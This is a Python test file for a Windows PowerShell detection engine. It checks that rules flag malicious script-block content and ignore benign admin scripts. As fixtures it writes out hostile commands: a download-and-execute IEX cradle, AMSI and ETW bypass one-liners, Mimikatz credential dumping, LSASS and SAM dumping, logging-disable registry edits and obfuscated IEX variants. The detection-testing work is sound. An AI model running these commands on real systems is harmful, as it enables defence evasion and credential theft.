"""Positive script-content observations, bounded identities and hard benign boundaries."""
import base64

import pytest

from romulus.catalog.attack import load_attack_bundle
from romulus.detect.windows_scripts import WINDOWS_SCRIPT_PLAYBOOKS
from romulus.evidence.windows import normalize_windows
from romulus.evidence.windows_reassembly import ScriptBlockAssembler
from romulus.hunt.publish import publish_match
from tests.test_sweep import _repo
from tests.test_windows_reassembly import _part
from tests.windows_event_support import event, run
from tests.windows_fixtures import SHAPES, LogicalWindowsEvent, windows_hit

RULES = {rule.id.removeprefix("win.script_"): rule for rule in WINDOWS_SCRIPT_PLAYBOOKS}
CASES = [
    ("download", "IEX (New-Object Net.WebClient).DownloadString('https://example.test/a')"),
    ("reflective_load", "[System.Reflection.Assembly]::Load($bytes)"),
    ("pinvoke", "$t::VirtualAlloc(0,4096,0x3000,0x40)"),
    ("amsi_bypass", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"),
    ("etw_bypass", "[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null,$null)"),
    ("obfuscated_execution", "IEX (-join [char[]](73,69,88))"),
    ("offensive_function", "Invoke-Mimikatz -DumpCreds"),
    ("lsass_access", "Get-Process -Name lsass | Out-Minidump"),
    ("sam_access", "reg.exe save HKLM\\SAM C:\\Temp\\sam.hiv"),
    ("dpapi_access", "[System.Security.Cryptography.ProtectedData]::Unprotect($bytes,$null,'CurrentUser')"),
    ("credential_harvest", "$c = Get-Credential; $c.GetNetworkCredential().Password | Out-File C:\\Temp\\passwords.txt"),
    ("logging_disable", "Set-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 0"),
    ("amsi_disable", "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows Script\\Settings' -Name AmsiEnable -Value 0"),
]


def script(text, *, block="b1", view="single", complete=True, code=4104, native=None, **fields):
    return event("script_block", code, native=native, **{
        "script.text": text, "script.block_id": block, "script.view": view,
        "script.complete": complete, **fields})


@pytest.mark.parametrize("name,text", CASES)
def test_each_script_shape_is_an_immediate_positive_content_lead(name, text):
    observation = script(text)
    [match] = RULES[name]().consume([observation])
    assert match.claim_type == "script_content"
    assert match.proposed_lane == ("high" if name in {"amsi_bypass", "etw_bypass", "offensive_function",
                                                      "lsass_access", "sam_access"} else "lead")
    assert match.events == [observation]
    assert any(p.field == "script.text" and "#parsed:powershell" in p.origin for p in match.predicate)
    assert "executed successfully" not in match.claim.lower()


@pytest.mark.parametrize("name,text", CASES)
def test_wrapping_the_shape_in_data_or_comment_cannot_match(name, text):
    rule = RULES[name]()
    assert not rule.consume([script("<# " + text + " #>")])
    assert not rule.consume([script("Write-Output '" + text.replace("'", "''") + "'", native="quoted")])


@pytest.mark.parametrize("text", [
    "Get-Credential | New-PSSession -ComputerName server",
    "Get-Process lsass | Select-Object Id,Name", "Get-MpComputerStatus; Update-MpSignature",
    "configuration WebServer { Node localhost { WindowsFeature IIS { Name='Web-Server'; Ensure='Present' } } }",
    "Get-CimInstance -Namespace root\\ccm -ClassName SMS_Client | Select-Object ClientVersion",
    "@{ RootModule='PowerView.psm1'; FunctionsToExport=@('Invoke-Mimikatz'); Description='AMSI bypass' }",
    "Get-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name EnableScriptBlockLogging",
    "Set-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 1",
    "$msg = 'System.Management.Automation.AmsiUtils amsiInitFailed VirtualAlloc'; Write-Output $msg",
    "Invoke-WebRequest -Uri https://packages.example.test/approved.msi -OutFile C:\\Temp\\approved.msi",
    "(New-Object Net.WebClient).DownloadFile('https://example.test/manual.pdf', 'C:\\Temp\\manual.pdf')",
])
def test_admin_dsc_sccm_defender_and_manifest_hard_negatives(text):
    assert not [(r.id, m.claim) for cls in WINDOWS_SCRIPT_PLAYBOOKS for r in [cls()] for m in r.consume([script(text)])]


def test_fragment_is_immediate_join_revises_same_identity_and_keeps_all_citations(tmp_path):
    assembler, rule = ScriptBlockAssembler(tmp_path), RULES["offensive_function"]()
    try:
        first = assembler.consume([_part(1, 2, "Invoke-Mimikatz; ")])
        [early] = rule.consume(first)
        assert "partial" in early.claim.lower()
        last = assembler.consume([_part(2, 2, "Get-Date")])
        [revised] = rule.consume(last)
        assert revised.revision_reason
        assert early.group_key == revised.group_key
        assert revised.events[0].get("script.view") == "joined"
        assert len(revised.events[0].raw) == 2
        assert len(run(RULES["offensive_function"](), [first, last])) == 1
    finally:
        assembler.close()


def test_boundary_only_match_in_joined_prefix_yields_one_finding(tmp_path):
    assembler, rule = ScriptBlockAssembler(tmp_path), RULES["offensive_function"]()
    try:
        assert not rule.consume(assembler.consume([_part(1, 2, "Invoke-Mimi")]))
        [match] = rule.consume(assembler.consume([_part(2, 2, "katz")]))
        assert match.events[0].get("script.view") == "joined"
        assert len(match.events[0].raw) == 2
    finally:
        assembler.close()


def test_join_without_fragment_match_preserves_the_fragment_finding(tmp_path):
    assembler = ScriptBlockAssembler(tmp_path, text_cap=8)
    rule = RULES["offensive_function"]()
    try:
        assert not rule.consume(assembler.consume([_part(1, 2, "Get-Date; ")]))
        output = assembler.consume([_part(2, 2, "Invoke-Mimikatz")])
        [match] = rule.consume(output)
        assert match.events[0].get("script.view") == "fragment"
        assert "partial" in match.claim.lower()
    finally:
        assembler.close()


def test_decoded_encoded_host_application_and_engine_start_version():
    encoded = base64.b64encode("Get-Date".encode("utf-16-le")).decode()
    observation = script("Get-Date", **{"script.host_application": f"powershell.exe -enc {encoded}"})
    [match] = RULES["encoded_command"]().consume([observation])
    assert "decoded" in match.claim.lower()
    assert any(p.field == "script.host_application" for p in match.predicate)
    assert not RULES["encoded_command"]().consume([script("Write-Output '-enc garbage'")])
    [match] = RULES["engine_v2"]().consume([script("", code=400, **{"script.engine_version": "2.0"})])
    assert match.claim_type == "script_content"
    for code, version in [(403, "2.0"), (400, "2.01"), (400, "5.1")]:
        assert not RULES["engine_v2"]().consume([script("", code=code, **{"script.engine_version": version})])


def test_attacks_exist_and_are_active_in_vendored_twenty_bundle():
    bundle = load_attack_bundle()
    active = {technique.id for technique in bundle.techniques if not technique.revoked and not technique.deprecated}
    for cls in WINDOWS_SCRIPT_PLAYBOOKS:
        assert not cls.assures_negative and cls.positive_only_reason
        for identifier in cls.attack:
            assert identifier in active


def test_real_repo_revises_fragment_to_join_and_resolves_every_raw_body(tmp_path):
    repo, assembler, rule = _repo(), ScriptBlockAssembler(tmp_path), RULES["offensive_function"]()
    try:
        ids = []
        for part in [_part(1, 2, "Invoke-Mimikatz; "), _part(2, 2, "Get-Date")]:
            raw = {part.raw[0].key: {"marker": part.id}}
            views = assembler.consume([part], raw)
            raw.update(assembler.sources_for(views))
            rule.bind_raw(raw)
            for match in rule.consume(views):
                result = publish_match(repo, "h1", rule, match, None, raw)
                if result:
                    ids.append(result["id"])
        [candidate] = repo.candidates("h1")
        assert ids == [candidate["id"]]
        assert "partial script view" not in candidate["claim"]
        citations = repo.citation_events("h1", candidate["event_ids"])
        bodies = repo.raw_records(sorted({raw_id for row in citations for raw_id in row["raw_ids"]}))
        assert {body["source"]["marker"] for body in bodies} == {"event-part-1", "event-part-2"}
        assert any(item["field"] == "script.view" and item["value"] == "joined"
                   for item in candidate["predicate_fields"])
    finally:
        assembler.close()


def test_many_script_blocks_spill_and_old_identity_still_revises(tmp_path):
    from romulus.detect.bounded import StateBudget
    rule = RULES["offensive_function"]()
    rule.budget = StateBudget(tmp_path, memory_total=16_384)
    rule.spill_dir = tmp_path
    first = None
    try:
        for index in range(2500):
            item = script(f"Invoke-Mimikatz -Marker {index}", block=f"block-{index}", view="fragment", complete=False,
                          native=f"script-{index}")
            [match] = rule.consume([item])
            first = first or match
        assert rule.views.on_disk > 0
        assert len(rule.views.hot) < 2500
        [joined] = rule.consume([script("Invoke-Mimikatz -Marker 0", block="block-0", view="joined", native="joined-0")])
        assert joined.group_key == first.group_key and joined.revision_reason
        assert not rule.consume([script("Invoke-Mimikatz -Marker 0", block="block-0", view="fragment", native="late-copy")])
    finally:
        rule.release_state()
        rule.close_spill()


def test_expansion_and_fresh_pivot_rules_share_one_revisable_block_identity():
    repo = _repo()
    fragment = script("Invoke-Mimikatz", view="fragment", complete=False, native="fragment")
    joined = script("Invoke-Mimikatz; Get-Date", view="joined", native="joined")
    ids = []
    for item in [fragment, joined, fragment]:
        rule = RULES["offensive_function"]()
        [match] = rule.consume([item])
        result = publish_match(repo, "h1", rule, match, None, {item.raw[0].key: {"marker": item.id}},
                               source_anchor_id="anchor", source_link_id="link")
        if result:
            ids.append(result["id"])
    [candidate] = repo.candidates("h1")
    assert len(ids) == 1
    assert set(candidate["event_ids"]) - set(candidate["context_event_ids"]) == {joined.id}
    assert candidate["gate_results"]["_evidence_view_origin"] == {
        "source_anchor_id": "anchor", "source_case_id": None, "source_link_id": "link"}
    assert "partial script view" not in candidate["claim"]


@pytest.mark.parametrize("name,text", CASES)
@pytest.mark.parametrize("shipper", SHAPES)
def test_script_shapes_survive_native_4104_normalization(name, text, shipper):
    from romulus.evidence.windows_catalog import POWERSHELL_CHANNEL, POWERSHELL_PROVIDER
    from tests.windows_event_support import START
    logical = LogicalWindowsEvent(POWERSHELL_CHANNEL, POWERSHELL_PROVIDER, 4104, "ws01", 100,
                                  START.isoformat().replace("+00:00", "Z"), {
                                      "ScriptBlockText": text, "ScriptBlockId": "11111111-2222-3333-4444-555555555555",
                                      "MessageNumber": "1", "MessageTotal": "1"})
    observation = normalize_windows(windows_hit(logical, shipper))
    [match] = RULES[name]().consume([observation])
    assert match.events[0].get("script.view") == "single"
    assert all(predicate.origin for predicate in match.predicate)


@pytest.mark.parametrize("text", [
    "I`EX ('test')", "IEX ('str'+'ing')", "IEX ('{0}{1}' -f 'te','st')",
    '& ("{1}{0}" -f "katz","Invoke-Mimi")', '& (-join [char[]](73,69,88))',
])
def test_obfuscation_classes_are_content_leads(text):
    [match] = RULES["obfuscated_execution"]().consume([script(text)])
    assert match.proposed_lane == "lead"


def test_pinvoke_declaration_is_code_only_inside_add_type_definition():
    declaration = '[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);'
    code = "Add-Type -TypeDefinition @'\n" + declaration + "\n'@"
    assert RULES["pinvoke"]().consume([script(code)])
    assert not RULES["pinvoke"]().consume([script("Write-Output '" + declaration + "'")])
    for comment in ["/* " + declaration + " */", "// " + declaration + "\n"]:
        assert not RULES["pinvoke"]().consume([script("Add-Type -TypeDefinition @'\n" + comment + "\n'@")])
